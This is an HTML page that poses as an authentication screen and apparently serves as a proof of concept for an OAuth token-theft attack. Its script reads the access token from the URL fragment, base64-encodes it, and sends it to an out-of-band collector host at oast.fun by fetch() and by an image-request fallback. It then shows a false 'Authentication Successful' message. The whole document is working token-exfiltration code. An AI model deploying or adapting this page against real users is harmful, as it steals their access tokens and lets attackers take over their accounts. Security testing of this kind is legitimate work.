<!DOCTYPE html>
<html>
<head><title>Authenticating...</title></head>
<body>
    <h1>Extracting Token...</h1>
    <script>
        // 1. Capture the fragment (#access_token=...)
        var fragment = window.location.hash;

        if (fragment) {
            // 2. Your active OAST URL
            var oastUrl = "https://d5ot4ita9dbh3gactc0gkzwgnyfrjp4gz.oast.fun/?token_data=" + btoa(fragment);

            // 3. Primary Send: Fetch
            fetch(oastUrl);

            // 4. Secondary Send: Image fallback (highest success rate)
            var leak = new Image();
            leak.src = oastUrl;

            console.log("Token sent to OAST!");
            
            // Give the browser time to complete the background requests
            setTimeout(function(){
                document.body.innerHTML = "<h1>Authentication Successful</h1><p>Check your OAST terminal for the interaction.</p>";
            }, 1000);
        } else {
            document.body.innerHTML = "<h1>Error: No fragment found.</h1><p>Ensure the URL contains a # fragment.</p>";
        }
    </script>
</body>
</html>
